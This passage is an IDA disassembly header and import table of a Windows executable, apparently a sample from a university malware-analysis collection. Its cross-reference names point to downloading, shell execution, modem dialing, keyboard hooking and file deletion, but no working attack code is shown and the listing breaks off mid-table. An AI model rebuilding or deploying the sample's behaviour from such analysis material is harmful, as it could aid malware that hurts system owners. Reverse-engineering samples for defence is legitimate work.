;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D1BA70FBD330E250BDFE1BEFE2B149C
; Input	CRC32 :	BA2D7AA8

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\0d1ba70fbd330e250bdfe1befe2b149c
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	1000000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000D000 (  53248.)
; Section size in file		: 0000D000 (  53248.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
;
; Imports from ADVAPI32.dll
;
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Externs
; _idata
; LSTATUS __stdcall RegQueryValueW(HKEY	hKey, LPCWSTR lpSubKey,	LPWSTR lpData, PLONG lpcbData)
		extrn __imp__RegQueryValueW@16:dword
					; CODE XREF: My32ShellExecute(ushort *)+29p
					; My32ShellExecute(ushort *)+5Bp
					; DATA XREF: ...
; LSTATUS __stdcall RegCloseKey(HKEY hKey)
		extrn __imp__RegCloseKey@4:dword
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+17Bp
					; DeleteIRN(void)+DFp ...
; LSTATUS __stdcall RegQueryValueExW(HKEY hKey,	LPCWSTR	lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE	lpData,	LPDWORD	lpcbData)
		extrn __imp__RegQueryValueExW@24:dword
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+16Fp
					; DeleteIRN(void)+B1p
					; DATA XREF: ...
; LSTATUS __stdcall RegOpenKeyW(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult)
		extrn __imp__RegOpenKeyW@12:dword
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+117p
					; DeleteIRN(void)+73p ...
; LSTATUS __stdcall RegDeleteValueW(HKEY hKey, LPCWSTR lpValueName)
		extrn __imp__RegDeleteValueW@8:dword ; CODE XREF: WinMain(x,x,x,x)+24Bp
					; DATA XREF: WinMain(x,x,x,x)+24Br
		extrn _ADVAPI32_NULL_THUNK_DATA:byte:4
;
; Imports from GDI32.dll
;
; int __stdcall	GetObjectW(HANDLE h, int c, LPVOID pv)
		extrn __imp__GetObjectW@12:dword
					; CODE XREF: MakeBold(HWND__ *,int,long)+3Cp
					; DATA XREF: MakeBold(HWND__ *,int,long)+3Cr ...
; HFONT	__stdcall CreateFontIndirectW(const LOGFONTW *lplf)
		extrn __imp__CreateFontIndirectW@4:dword
					; CODE XREF: MakeBold(HWND__ *,int,long)+6Dp
					; DATA XREF: MakeBold(HWND__ *,int,long)+6Dr
; BOOL __stdcall DeleteObject(HGDIOBJ ho)
		extrn __imp__DeleteObject@4:dword ; CODE XREF: ReleaseBold(HWND__ *)+19p
					; DATA XREF: ReleaseBold(HWND__	*)+19r
; HGDIOBJ __stdcall GetStockObject(int i)
		extrn __imp__GetStockObject@4:dword
					; CODE XREF: ProcessDBCS(HWND__	*,int)+17p
					; ProcessDBCS(HWND__ *,int)+1Fp
					; DATA XREF: ...
		extrn _GDI32_NULL_THUNK_DATA:byte:4
;
; Imports from KERNEL32.dll
;
; HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes)
		extrn __imp__LocalAlloc@8:dword	; CODE XREF: My32ShellExecute(ushort *)+43p
					; DATA XREF: My32ShellExecute(ushort *)+43r ...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn __imp__ExitProcess@4:dword ; CODE	XREF: WinMain(x,x,x,x)+2F9p
					; ___crtExitProcess+2Cp
					; DATA XREF: ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn __imp__WriteFile@20:dword	; CODE XREF: __NMSG_WRITE+1CFp
					; __write+113p	...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn __imp__SetFilePointer@16:dword ; CODE XREF: __lseeki64+54p
					; DATA XREF: __lseeki64+54r
; DWORD	__stdcall GetCurrentProcessId()
		extrn __imp__GetCurrentProcessId@0:dword
					; CODE XREF: ___security_init_cookie+29p
					; DATA XREF: ___security_init_cookie+29r
; DWORD	__stdcall GetCurrentThreadId()
		extrn __imp__GetCurrentThreadId@0:dword
					; CODE XREF: DialErrDlgProc(x,x,x,x)+167p
					; ___security_init_cookie+31p
					; DATA XREF: ...
; LPWSTR __stdcall GetCommandLineW()
		extrn __imp__GetCommandLineW@0:dword ; CODE XREF: WinMain(x,x,x,x)+7Dp
					; DATA XREF: WinMain(x,x,x,x)+7Dr
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn __imp__GlobalFree@4:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+109p
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+114p ...
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn __imp__FreeLibrary@4:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+F4p
					; LclSetEntryScriptPatch(ushort	*,ushort *)+35p ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn __imp__GetProcAddress@8:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+E1p
					; LclSetEntryScriptPatch(ushort	*,ushort *)+20p ...
; DWORD	__stdcall GetLastError()
		extrn __imp__GetLastError@0:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *):loc_10039B4p
					; MakeBold(HWND__ *,int,long):loc_10052D2p ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn __imp__LoadLibraryW@4:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+C5p
					; LclSetEntryScriptPatch(ushort	*,ushort *)+Ep	...
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes)
		extrn __imp__GlobalAlloc@8:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+19p
					; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+60p ...
; LPWSTR __stdcall lstrcpynW(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength)
		extrn __imp__lstrcpynW@12:dword
					; CODE XREF: DialErrGetDisplayableNumber(void)+27Ep
					; DialErrDlgProc(x,x,x,x)+363p	...
; LPWSTR __stdcall lstrcpyW(LPWSTR lpString1, LPCWSTR lpString2)
		extrn __imp__lstrcpyW@8:dword
					; CODE XREF: DialErrGetDisplayableNumber(void)+14Fp
					; DialErrGetDisplayableNumber(void)+15Dp ...
; DWORD	__stdcall GetPrivateProfileStringW(LPCWSTR lpAppName, LPCWSTR lpKeyName, LPCWSTR lpDefault, LPWSTR lpReturnedString, DWORD nSize, LPCWSTR lpFileName)
		extrn __imp__GetPrivateProfileStringW@24:dword
					; CODE XREF: DoneDlgProc(x,x,x,x)+79p
					; DoneRebootDlgProc(x,x,x,x)+77p ...
; BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW	lpVersionInformation)
		extrn __imp__GetVersionExW@4:dword ; CODE XREF:	IsNT(void)+32p
					; DATA XREF: IsNT(void)+32r
; int __stdcall	lstrcmpiW(LPCWSTR lpString1, LPCWSTR lpString2)
		extrn __imp__lstrcmpiW@8:dword ; CODE XREF: FillModems(void)+16Ap
					; FillModems(void)+18Dp ...
; HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
		extrn __imp__GetModuleHandleW@4:dword
					; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+4Cp
					; GetSz(ushort)+39p
					; DATA XREF: ...
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn __imp__FindClose@4:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+16Ep
					; FileExists(ushort *)+28p
					; DATA XREF: ...
; BOOL __stdcall FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
		extrn __imp__FindNextFileW@8:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+163p
					; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+163r
; BOOL __stdcall DeleteFileW(LPCWSTR lpFileName)
		extrn __imp__DeleteFileW@4:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+149p
					; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+149r
; BOOL __stdcall SetFileAttributesW(LPCWSTR lpFileName,	DWORD dwFileAttributes)
		extrn __imp__SetFileAttributesW@8:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+13Cp
					; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+13Cr
; HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
		extrn __imp__FindFirstFileW@8:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+111p
					; FileExists(ushort *)+1Fp
					; DATA XREF: ...
; LPWSTR __stdcall lstrcatW(LPWSTR lpString1, LPCWSTR lpString2)
		extrn __imp__lstrcatW@8:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+ECp
					; WinMain(x,x,x,x)+12Ep ...
; int __stdcall	CompareStringW(LCID Locale, DWORD dwCmpFlags, LPCWSTR lpString1, int cchCount1,	LPCWSTR	lpString2, int cchCount2)
		extrn __imp__CompareStringW@24:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+AAp
					; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+AAr
; DWORD	__stdcall GetFullPathNameW(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart)
		extrn __imp__GetFullPathNameW@16:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+7Ap
					; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+7Ar
; UINT __stdcall GetPrivateProfileIntW(LPCWSTR lpAppName, LPCWSTR lpKeyName, INT nDefault, LPCWSTR lpFileName)
		extrn __imp__GetPrivateProfileIntW@16:dword
					; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+4Dp
					; WinMain(x,x,x,x)+19Cp
					; DATA XREF: ...
; HANDLE __stdcall CreateSemaphoreW(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCWSTR lpName)
		extrn __imp__CreateSemaphoreW@16:dword ; CODE XREF: WinMain(x,x,x,x)+54p
					; DATA XREF: WinMain(x,x,x,x)+54r
; BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)
		extrn __imp__QueryPerformanceCounter@4:dword
					; CODE XREF: ___security_init_cookie+45p
					; DATA XREF: ___security_init_cookie+45r
; DWORD	__stdcall GetTickCount()
		extrn __imp__GetTickCount@0:dword ; CODE XREF: ___security_init_cookie+39p
					; DATA XREF: ___security_init_cookie+39r
; void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime)
		extrn __imp__GetSystemTimeAsFileTime@4:dword
					; CODE XREF: ___security_init_cookie+1Dp
					; DATA XREF: ___security_init_cookie+1Dr
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn __imp__TerminateProcess@8:dword ;	CODE XREF: ___report_gsfailure+EFp
					; DATA XREF: ___report_gsfailure+EFr
; HANDLE __stdcall GetCurrentProcess()
		extrn __imp__GetCurrentProcess@0:dword ; CODE XREF: ___report_gsfailure+E8p
					; DATA XREF: ___report_gsfailure+E8r
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn __imp__UnhandledExceptionFilter@4:dword
					; CODE XREF: ___report_gsfailure+DDp
					; __XcptFilter+169p
					; DATA XREF: ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn __imp__SetUnhandledExceptionFilter@4:dword
					; CODE XREF: ___report_gsfailure+D3p
					; DATA XREF: ___report_gsfailure+D3r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn __imp__CloseHandle@4:dword ; CODE	XREF: __close+6Bp
					; DATA XREF: __close+6Br
; LPSTR	__stdcall GetCommandLineA()
		extrn __imp__GetCommandLineA@0:dword
					; CODE XREF: _WinMainCRTStartup:loc_1006597p
					; DATA XREF: _WinMainCRTStartup:loc_1006597r
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn __imp__GetVersionExA@4:dword ; CODE XREF:	_WinMainCRTStartup+20p
					; DATA XREF: _WinMainCRTStartup+20r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn __imp__GetModuleHandleA@4:dword ;	CODE XREF: ___crtExitProcess+Ap
					; DATA XREF: ___crtExitProcess+Ar
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn __imp__GetStdHandle@4:dword ; CODE XREF: __NMSG_WRITE+1A5p
					; __ioinit+15Ap
					; DATA XREF: ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn __imp__GetModuleFileNameA@12:dword ; CODE	XREF: __NMSG_WRITE+7Ep
					; __setargv+2Cp
					; DATA XREF: ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn __imp__FreeEnvironmentStringsA@4:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+11Bp
					; DATA XREF: ___crtGetEnvironmentStringsA+11Br
; LPCH __stdcall GetEnvironmentStrings()
		extrn __imp__GetEnvironmentStrings@0:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_1007A88p
					; DATA XREF: ___crtGetEnvironmentStringsA:loc_1007A88r
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn __imp__FreeEnvironmentStringsW@4:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+C1p
					; DATA XREF: ___crtGetEnvironmentStringsA+C1r
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn __imp__WideCharToMultiByte@32:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+88p
					; ___crtGetEnvironmentStringsA+ABp ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn __imp__GetEnvironmentStringsW@0:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Ep
					; ___crtGetEnvironmentStringsA+55p
					; DATA XREF: ...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn __imp__SetHandleCount@4:dword ; CODE XREF: __ioinit+19Fp
					; DATA XREF: __ioinit+19Fr
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn __imp__GetFileType@4:dword ; CODE	XREF: __ioinit+FFp
					; __ioinit+168p
					; DATA XREF: ...
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn __imp__HeapDestroy@4:dword ; CODE	XREF: __heap_init+48p
					; DATA XREF: __heap_init+48r
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn __imp__HeapCreate@12:dword ; CODE	XREF: __heap_init+15p
					; DATA XREF: __heap_init+15r
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn __imp__VirtualFree@12:dword ; CODE XREF: ___sbh_free_block+249p
					; ___sbh_free_block+2A4p
					; DATA XREF: ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn __imp__HeapFree@12:dword ; CODE XREF: _free+34p
					; ___sbh_free_block+2B6p ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn __imp__HeapAlloc@12:dword	; CODE XREF: __heap_alloc+42p
					; ___sbh_heap_init+12p	...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn __imp__LCMapStringA@24:dword ; CODE XREF:	___crtLCMapStringA+2C6p
					; ___crtLCMapStringA+357p ...
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn __imp__MultiByteToWideChar@24:dword
					; CODE XREF: ___crtLCMapStringA+BFp
					; ___crtLCMapStringA+143p ...
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn __imp__LCMapStringW@24:dword ; CODE XREF:	___crtLCMapStringA+27p
					; ___crtLCMapStringA+15Dp ...
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn __imp__GetCPInfo@8:dword ; CODE XREF: ___init_ctype+95p
					; sub_1009FB7+21p ...
; LCID __stdcall GetUserDefaultLCID()
		extrn __imp__GetUserDefaultLCID@0:dword	; CODE XREF: _GetLcidFromDefault+9p
					; DATA XREF: _GetLcidFromDefault+9r
; int __stdcall	GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn __imp__GetLocaleInfoA@16:dword ; CODE XREF: sub_1009340+40p
					; ___ansicp+22p ...
; BOOL __stdcall EnumSystemLocalesA(LOCALE_ENUMPROCA lpLocaleEnumProc, DWORD dwFlags)
		extrn __imp__EnumSystemLocalesA@8:dword	; CODE XREF: sub_10098B1+26p
					; sub_10098F3+70p ...
; BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags)
		extrn __imp__IsValidLocale@8:dword ; CODE XREF:	___get_qualified_locale+129p
					; DATA XREF: ___get_qualified_locale+129r
; BOOL __stdcall IsValidCodePage(UINT CodePage)
		extrn __imp__IsValidCodePage@4:dword
					; CODE XREF: ___get_qualified_locale+113p
					; DATA XREF: ___get_qualified_locale+113r
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn __imp__GetStringTypeA@20:dword ; CODE XREF: ___crtGetStringTypeA+1A4p
					; DATA XREF: ___crtGetStringTypeA+1A4r
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
		extrn __imp__GetStringTypeW@16:dword ; CODE XREF: ___crtGetStringTypeA+24p
					; ___crtGetStringTypeA+130p
					; DATA XREF: ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn __imp__LoadLibraryA@4:dword ; CODE XREF: ___crtMessageBoxA+1Ap
					; DATA XREF: ___crtMessageBoxA+1Ar
; UINT __stdcall GetACP()
		extrn __imp__GetACP@0:dword ; CODE XREF: __setmbcp+44p
					; DATA XREF: __setmbcp+44r
; UINT __stdcall GetOEMCP()
		extrn __imp__GetOEMCP@0:dword ;	CODE XREF: __setmbcp+2Dp
					; DATA XREF: __setmbcp+2Dr
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn __imp__VirtualAlloc@16:dword ; CODE XREF:	___sbh_alloc_new_region+7Ep
					; ___sbh_alloc_new_group+54p
					; DATA XREF: ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn __imp__HeapReAlloc@16:dword ; CODE XREF: ___sbh_alloc_new_region+27p
					; DATA XREF: ___sbh_alloc_new_region+27r
; __declspec(dllimport)	__stdcall RtlUnwind(x, x, x, x)
		extrn __imp__RtlUnwind@16:dword	; DATA XREF: RtlUnwind(x,x,x,x)r
; LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value)
		extrn __imp__InterlockedExchange@8:dword ; CODE	XREF: __ValidateEH3RN+134p
					; __ValidateEH3RN+199p	...
; SIZE_T __stdcall VirtualQuery(LPCVOID	lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
		extrn __imp__VirtualQuery@12:dword ; CODE XREF:	__ValidateEH3RN+B6p
					; __resetstkoflw+1Cp
					; DATA XREF: ...
; BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
		extrn __imp__VirtualProtect@16:dword ; CODE XREF: __resetstkoflw+71p
					; DATA XREF: __resetstkoflw+71r
; void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)
		extrn __imp__GetSystemInfo@4:dword ; CODE XREF:	__resetstkoflw+2Dp
					; DATA XREF: __resetstkoflw+2Dr
; BOOL __stdcall SetStdHandle(DWORD nStdHandle,	HANDLE hHandle)
		extrn __imp__SetStdHandle@8:dword ; CODE XREF: __free_osfhnd:loc_100BD2Cp
					; DATA XREF: __free_osfhnd:loc_100BD2Cr
; int __stdcall	GetLocaleInfoW(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int	cchData)
		extrn __imp__GetLocaleInfoW@16:dword ; CODE XREF: ___crtGetLocaleInfoW+1Dp
					; ___crtGetLocaleInfoW+59p ...
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
		extrn __imp__FlushFileBuffers@4:dword ;	CODE XREF: __commit+30p
					; DATA XREF: __commit+30r
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn __imp__Sleep@4:dword
					; CODE XREF: WaitForConnectionTermination(HRASCONN__ *)+37p
					; DATA XREF: WaitForConnectionTermination(HRASCONN__ *)+37r
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn __imp__LocalFree@4:dword ; CODE XREF: My32ShellExecute(ushort *)+64p
					; DATA XREF: My32ShellExecute(ushort *)+64r
; int __stdcall	lstrcmpW(LPCWSTR lpString1, LPCWSTR lpString2)
		extrn __imp__lstrcmpW@8:dword ;	CODE XREF: FillModems(void)+1E4p
					; DialErrDlgProc(x,x,x,x)+4B4p	...
; int __stdcall	lstrlenW(LPCWSTR lpString)
		extrn __imp__lstrlenW@4:dword
					; CODE XREF: DialErrGetDisplayableNumber(void)+112p
					; CopyCmdLineData(ushort *,ushort *,ushort *)+1Fp ...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn __imp__GetStartupInfoA@4:dword ; CODE XREF: _WinMainCRTStartup+15Dp
					; __ioinit+58p
					; DATA XREF: ...
		extrn _KERNEL32_NULL_THUNK_DATA:byte:4
;
; Imports from RASAPI32.dll
;
; DWORD	__stdcall RasGetConnectStatusW(HRASCONN, struct	tagRASCONNSTATUSW *)
		extrn __imp__RasGetConnectStatusW@8:dword
					; DATA XREF: RasGetConnectStatusW(x,x)r
					; .text:0100C6D0o
; DWORD	__stdcall RasHangUpW(HRASCONN)
		extrn __imp__RasHangUpW@4:dword	; DATA XREF: RasHangUpW(x)r
; DWORD	__stdcall RasEnumConnectionsW(struct tagRASCONNW *, LPDWORD, LPDWORD)
		extrn __imp__RasEnumConnectionsW@12:dword
					; DATA XREF: RasEnumConnectionsW(x,x,x)r
		extrn _RASAPI32_NULL_THUNK_DATA:byte:4
;
; Imports from SHELL32.dll
;
; HINSTANCE __stdcall ShellExecuteW(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd)
		extrn __imp__ShellExecuteW@24:dword
					; CODE XREF: My32ShellExecute(ushort *)+D6p
					; DATA XREF: My32ShellExecute(ushort *)+D6r ...
		extrn _SHELL32_NULL_THUNK_DATA:byte:4
;
; Imports from TAPI32.dll
;
; LONG __stdcall lineTranslateAddressW(HLINEAPP	hLineApp, DWORD	dwDeviceID, DWORD dwAPIVersion,	LPCWSTR	lpszAddressIn, DWORD dwCard, DWORD dwTranslateOptions, LPLINETRANSLATEOUTPUT lpTranslateOutput)
		extrn __imp__lineTranslateAddressW@28:dword
					; DATA XREF: lineTranslateAddressW(x,x,x,x,x,x,x)r
					; .text:0100C6BCo
; LONG __stdcall lineShutdown(HLINEAPP hLineApp)
		extrn __imp__lineShutdown@4:dword ; DATA XREF: lineShutdown(x)r
; LONG __stdcall lineNegotiateAPIVersion(HLINEAPP hLineApp, DWORD dwDeviceID, DWORD dwAPILowVersion, DWORD dwAPIHighVersion, LPDWORD lpdwAPIVersion, LPLINEEXTENSIONID lpExtensionID)
		extrn __imp__lineNegotiateAPIVersion@24:dword
					; DATA XREF: lineNegotiateAPIVersion(x,x,x,x,x,x)r
; LONG __stdcall lineInitialize(LPHLINEAPP lphLineApp, HINSTANCE hInstance, LINECALLBACK lpfnCallback, LPCSTR lpszAppName, LPDWORD lpdwNumDevs)
		extrn __imp__lineInitialize@20:dword ; DATA XREF: lineInitialize(x,x,x,x,x)r
; LONG __stdcall lineTranslateDialogW(HLINEAPP hLineApp, DWORD dwDeviceID, DWORD dwAPIVersion, HWND hwndOwner, LPCWSTR lpszAddressIn)
		extrn __imp__lineTranslateDialogW@20:dword
					; DATA XREF: lineTranslateDialogW(x,x,x,x,x)r
		extrn _TAPI32_NULL_THUNK_DATA:byte:4
;
; Imports from USER32.dll
;
; LRESULT __stdcall CallNextHookEx(HHOOK hhk, int nCode, WPARAM	wParam,	LPARAM lParam)
		extrn __imp__CallNextHookEx@16:dword
					; CODE XREF: HelpKybdHookProc(int,uint,long)+58p
					; DATA XREF: HelpKybdHookProc(int,uint,long)+58r ...
; HWND __stdcall GetActiveWindow()
		extrn __imp__GetActiveWindow@0:dword
					; CODE XREF: HelpKybdHookProc(int,uint,long)+1Cp
					; DATA XREF: HelpKybdHookProc(int,uint,long)+1Cr
; HHOOK	__stdcall SetWindowsHookExW(int	idHook,	HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId)
		extrn __imp__SetWindowsHookExW@16:dword
					; CODE XREF: DialErrDlgProc(x,x,x,x)+181p
					; DATA XREF: DialErrDlgProc(x,x,x,x)+181r
; BOOL __stdcall UnhookWindowsHookEx(HHOOK hhk)
		extrn __imp__UnhookWindowsHookEx@4:dword
					; CODE XREF: DialErrDlgProc(x,x,x,x)+743p
					; DATA XREF: DialErrDlgProc(x,x,x,x)+743r
; LRESULT __stdcall SendDlgItemMessageW(HWND hDlg, int nIDDlgItem, UINT	Msg, WPARAM wParam, LPARAM lParam)
		extrn __imp__SendDlgItemMessageW@20:dword ; CODE XREF: FillModems(void)+1B2p
					; FillModems(void)+1C9p ...
; UINT __stdcall GetDlgItemTextW(HWND hDlg, int	nIDDlgItem, LPWSTR lpString, int cchMax)
		extrn __imp__GetDlgItemTextW@16:dword
					; CODE XREF: DialErrDlgProc(x,x,x,x)+484p
					; DialErrDlgProc(x,x,x,x)+541p
					; DATA XREF: ...
; LRESULT __stdcall SendMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
		extrn __imp__SendMessageW@16:dword
					; CODE XREF: ProcessDBCS(HWND__	*,int)+37p
					; ReleaseBold(HWND__ *)+Ep ...
; HWND __stdcall SetFocus(HWND hWnd)
		extrn __imp__SetFocus@4:dword ;	CODE XREF: DialErrDlgProc(x,x,x,x)+153p
					; DialErrDlgProc(x,x,x,x)+2BCp	...
; BOOL __stdcall WinHelpW(HWND hWndMain, LPCWSTR lpszHelp, UINT	uCommand, ULONG_PTR dwData)
		extrn __imp__WinHelpW@16:dword ; CODE XREF: DialErrDlgProc(x,x,x,x)+1C8p
					; DialErrDlgProc(x,x,x,x)+70Ap
					; DATA XREF: ...
; INT_PTR __stdcall DialogBoxParamW(HINSTANCE hInstance, LPCWSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc,	LPARAM dwInitParam)
		extrn __imp__DialogBoxParamW@20:dword
					; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+A7p
					; ShowDialReallyCancelDialog(HINSTANCE__ *,HWND__ *,ushort *)+15p ...
; LPWSTR __stdcall CharUpperW(LPWSTR lpsz)
		extrn __imp__CharUpperW@4:dword	; CODE XREF: ParseCommandLine(ushort *)+Ap
					; DATA XREF: ParseCommandLine(ushort *)+Ar
; BOOL __stdcall ExitWindowsEx(UINT uFlags, DWORD dwReason)
